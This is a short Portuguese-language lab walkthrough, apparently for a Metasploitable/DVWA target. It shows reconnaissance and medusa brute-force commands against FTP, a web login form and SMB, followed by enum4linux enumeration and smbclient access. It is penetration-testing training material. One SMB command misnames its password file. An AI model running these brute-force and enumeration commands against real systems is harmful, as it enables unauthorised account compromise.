# Conectando ao FTP

Descobrindo se as máquinas estão conectadas

ping -c 3 ip

Vendo as portas abertas

nmap ip

Criando a lista de username

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Criando a lista de passwords

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

Bruteforce com medusa

medusa -h ip -U users.txt -P pass.txt -M ftp -t 6


# Conectando ao http

Criando a lista de username

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt

Criando a lista de passwords

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

Bruteforce com medusa

medusa -h ip -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL:'Login failed' -t 6

<img width="1105" height="840" alt="image" src="https://github.com/user-attachments/assets/b29173c9-7d91-4b4a-bc8d-06cbfa94bebb" />

# Conectando ao smb

Enumeração

enum4linux -a 192.168.56.101 | tee enum4_output.txt

Abrir o arquivo 

less enum4_output.txt

<img width="1063" height="857" alt="image" src="https://github.com/user-attachments/assets/b31b6098-5102-4709-a13d-2ed27aceeea0" />

Criando a lista de username

echo -e 'user\nmsfadmin\nadmin\nroot' > smb_users.txt

Criando a lista de passwords

echo -e '123456\npassword\nWelcome123\nmsfadmin' > senhas_spray.txt

Bruteforce com medusa

medusa -h ip -U smb_users.txt -P psenhas_spray.txt -M smbnt -t 2 -T 50

Conectando SMB

smbclient -L //192.168.56.101 -U msfadmin

<img width="1250" height="727" alt="image" src="https://github.com/user-attachments/assets/4f0d163a-518b-4331-9662-498522ca9f08" />





